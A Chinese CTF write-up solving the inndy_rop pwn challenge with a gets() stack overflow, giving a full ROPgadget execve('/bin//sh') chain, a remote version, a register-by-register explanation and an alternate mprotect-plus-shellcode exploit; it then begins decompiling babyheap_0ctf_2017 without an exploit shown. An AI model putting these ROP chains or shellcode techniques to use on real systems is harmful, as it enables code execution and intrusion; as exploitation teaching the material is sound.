# inndy_rop
>知识点：rop

checksec看了看文件，32位，只开了NX，然后放进IDA看看，发现很多函数，很复杂，那就是静态编译了，静态编译不会调用libc的函数，那就不能用ret2libc，然后发现了很明显的栈溢出
```c
int overflow()
{
  char v1[12]; // [esp+Ch] [ebp-Ch] BYREF

  return gets(v1);
}
```
ROPgadget有一个功能，直接利用程序中的片段拼凑rop链
```
ROPgadget --binary rop --ropchain
```
```
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
 1 from pwn import *
 2 from struct import pack
 3 
 4 q = process('./rop')
 5 context.log_level = 'debug'
 6 
 7 def payload():
 8     p = 'a'*0xc + 'bbbb'
 9     p += pack('<I', 0x0806ecda) # pop edx ; ret
10     p += pack('<I', 0x080ea060) # @ .data
11     p += pack('<I', 0x080b8016) # pop eax ; ret
12     p += '/bin'
13     p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
14     p += pack('<I', 0x0806ecda) # pop edx ; ret
15     p += pack('<I', 0x080ea064) # @ .data + 4
16     p += pack('<I', 0x080b8016) # pop eax ; ret
17     p += '//sh'
18     p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
19     p += pack('<I', 0x0806ecda) # pop edx ; ret
20     p += pack('<I', 0x080ea068) # @ .data + 8
21     p += pack('<I', 0x080492d3) # xor eax, eax ; ret
22     p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
23     p += pack('<I', 0x080481c9) # pop ebx ; ret
24     p += pack('<I', 0x080ea060) # @ .data
25     p += pack('<I', 0x080de769) # pop ecx ; ret
26     p += pack('<I', 0x080ea068) # @ .data + 8
27     p += pack('<I', 0x0806ecda) # pop edx ; ret
28     p += pack('<I', 0x080ea068) # @ .data + 8
29     p += pack('<I', 0x080492d3) # xor eax, eax ; ret
30     p += pack('<I', 0x0807a66f) # inc eax ; ret
31     p += pack('<I', 0x0807a66f) # inc eax ; ret
32     p += pack('<I', 0x0807a66f) # inc eax ; ret
33     p += pack('<I', 0x0807a66f) # inc eax ; ret
34     p += pack('<I', 0x0807a66f) # inc eax ; ret
35     p += pack('<I', 0x0807a66f) # inc eax ; ret
36     p += pack('<I', 0x0807a66f) # inc eax ; ret
37     p += pack('<I', 0x0807a66f) # inc eax ; ret
38     p += pack('<I', 0x0807a66f) # inc eax ; ret
39     p += pack('<I', 0x0807a66f) # inc eax ; ret
40     p += pack('<I', 0x0807a66f) # inc eax ; ret
41     p += pack('<I', 0x0806c943) # int 0x80
42     return p
43 shell = payload()
44 q.sendline(shell)
45 q.interactive()
```
所以只要加一个偏移量就行了
```python
from pwn import*
from struct import*     #pack
#io=process('./rop')
io=remote('node5.buuoj.cn',26760)
p=b'a'*(0xc+4)
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b8016) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b8016) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de769) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0806c943) # int 0x80
io.sendline(p)
io.interactive()

```
脚本的解释
```bash
工具函数说明
pack('<I', addr)


把 32-bit 地址按 小端 (<I) 打包为 4 字节，用于放在 payload 中作为“返回地址 / 参数”。

写入字符串 "/bin//sh" 到 .data 段

这段通过一系列 pop / mov [edx], eax gadget 把字符串写入可写内存（.data）：

# 写入 "/bin" 到 .data
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea060) # address: @ .data
p += pack('<I', 0x080b8016) # pop eax ; ret
p += b'/bin'               # 4 字节
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret


思路：先用 pop edx 将目标地址放到 edx（指向 .data），再 pop eax 将要写入的 4 字节放到 eax，最后用 mov [edx], eax 把 eax 的 4 字节写入内存。

然后写入 //sh（注意双斜杠）到 .data+4：

p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b8016) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret


'/bin' + '//sh' 组合成 "/bin//sh"（双斜杠是合法的，execve 能接受，常用于使字符串恰好对齐 8 字节）。

再写入一个 null 终止（4 字节 0）到 .data+8：

p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret


xor eax, eax 把 eax 清零，然后 mov [edx], eax 写 0，使字符串以 \x00 结尾（C 字符串终止符）。

总结：现在内存 0x080ea060 处存放 "/bin//sh\0"，正好适合作为 execve 的第一个参数（指针指向该字符串）。

设置寄存器准备 execve("/bin//sh", argv=NULL, envp=NULL)

execve 在 Linux x86 通过 int 0x80 使用 syscall number 11（即 eax = 11），参数如下：

ebx -> 指向 filename（字符串地址）

ecx -> argv（指针数组），这里传 NULL

edx -> envp，传 NULL

脚本依次设置这三个寄存器：

p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # ebx = @ .data  (pointer to "/bin//sh")

p += pack('<I', 0x080de769) # pop ecx ; ret
p += pack('<I', 0x080ea068) # ecx = @ .data + 8  (这里指向 NULL 写入处)

p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # edx = @ .data + 8  (同上, 指向 NULL)


ecx 和 edx 都被设为指向 .data+8，而我们之前已经在 .data+8 写入了 0（null），所以 ecx / edx 实际上相当于 NULL 指针（即 argv=NULL, envp=NULL）。

把 eax 设为 11（sys_execve 的 syscall 编号）

脚本用了先清零 eax（xor eax, eax），然后连续执行 11 次 inc eax：

p += pack('<I', 0x080492d3) # xor eax, eax ; ret
# 然后连续 11 次：
p += pack('<I', 0x0807a66f) # inc eax ; ret
... (共 11 次 inc)


结果：eax = 11。

（注意：也可以寻找 pop eax; ret 然后写 11，但很多二进制没有直接把小常数放到 eax 的 gadget，所以用 xor + 多次 inc 是常见做法。）

发起系统调用：int 0x80

最后调用 int 0x80 gadget 发起系统调用：

p += pack('<I', 0x0806c943) # int 0x80


在此时 eax=11, ebx=ptr("/bin//sh"), ecx=0, edx=0，因此内核会执行 execve("/bin//sh", NULL, NULL)，成功的话进程会被替换成 /bin/sh，脚本最后 io.interactive() 给你交互式 shell。
```
第二种方法：
利用mprotect(),这是静态编译一定存在的函数，可以对某个地址的权限进行修改，将其修改为可读可写可执行
![alt text](image.png)
需要注意的是，参数addr必须是4kb的整数倍,也就是0x1000(4096=0x1000)字节的整数倍,size的大小也得是0x1000的整数倍，想要可读可写可执行，prot传入7就可以了，接下来我们可以找找要更改的地址
![alt text](image-1.png)
刚好0x80e9000满足0x1000的倍数，第二个参数设置成0x2000
先利用栈溢出使用mprotext函数，返回地址为主函数，然会利用read函数写入shellcode
```python
from pwn import*
from struct import*     #pack
#io=process('./rop')
io=remote('node5.buuoj.cn',27234)

mprotext_adr=0x0806DDA0
make_adr=0x80e9000 
main_adr=0x08048894
payload=b'a'*(0xc+0x4)+p32(mprotext_adr)+p32(main_adr)+p32(make_adr)+p32(0x2000)+p32(0x7)
io.sendline(payload)
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
read_adr=0x0806D290
payload = b"A"*(0xc+0x4) + p32(read_adr) + p32(make_adr) + p32(0) + p32(make_adr) + p32(len(shellcode))

io.sendline(payload)

io.sendline(shellcode)

io.interactive()
```

# babyheap_0ctf_2017
>知识点：heap
![alt text](image-2.png)
保护全开，看题目提示是堆漏洞,仔细看看题目

主函数
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = sub_B70(a1, a2, a3);
  while ( 1 )
  {
    sub_CF4();
    switch ( sub_138C() )
    {
      case 1LL:
        sub_D48(v4);
        break;
      case 2LL:
        sub_E7F(v4);
        break;
      case 3LL:
        sub_F50(v4);
        break;
      case 4LL:
        sub_1051(v4);
        break;
      case 5LL:
        return 0LL;
      default:
        continue;
    }
  }
}
```
sub_B70()
```c
char *sub_B70()
{
  int fd; // [rsp+4h] [rbp-3Ch]
  char *addr; // [rsp+8h] [rbp-38h]
  unsigned __int64 v3; // [rsp+10h] [rbp-30h]
  __int64 buf[4]; // [rsp+20h] [rbp-20h] BYREF

  buf[3] = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  alarm(0x3Cu);
  puts("===== Baby Heap in 2017 =====");
  fd = open("/dev/urandom", 0);
  if ( fd < 0 || read(fd, buf, 0x10uLL) != 16 )
    exit(-1);
  close(fd);
  addr = (char *)((buf[0] % 0x555555543000uLL + 0x10000) & 0xFFFFFFFFFFFFF000LL);
  v3 = (buf[1] % 0xE80uLL) & 0xFFFFFFFFFFFFFFF0LL;
  if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr )
    exit(-1);
  return &addr[v3];
}
```
里面有个mmp函数，整个函数是用来获取一片函数空间
![alt text](image-3.png)

sub_D40
```c
void __fastcall sub_D48(__int64 a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = sub_138C();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;//表示堆的创建，该空间已经被使用
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;//堆大小
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;//表示储存首地址
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```
循环16次，先判断空间是否被使用，然后要求输入堆的大小，要求0<szie<4096，然后申请空间
sub_E7F(v4)
```c
__int64 __fastcall sub_E7F(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();//输入编辑的chunk
  v2 = result;
  if ( (unsigned int)result <= 0xF )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = sub_138C();
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```
这个函数意思是输入你要编辑的chunk，然后检测结构体第一个看看堆是否存在
然后输入想要编辑的堆大小，然后再读入size大小到chunk

sub_F50:sub_F50:普通的堆释放函数
```c
__int64 __fastcall sub_F50(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (unsigned int)result <= 0xF )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```
然后是打印函数
```c
int __fastcall sub_1051(__int64 a1)
{
  int result; // eax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (unsigned int)result <= 0xF )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      return puts(byte_14F1);
    }
  }
  return result;
}
```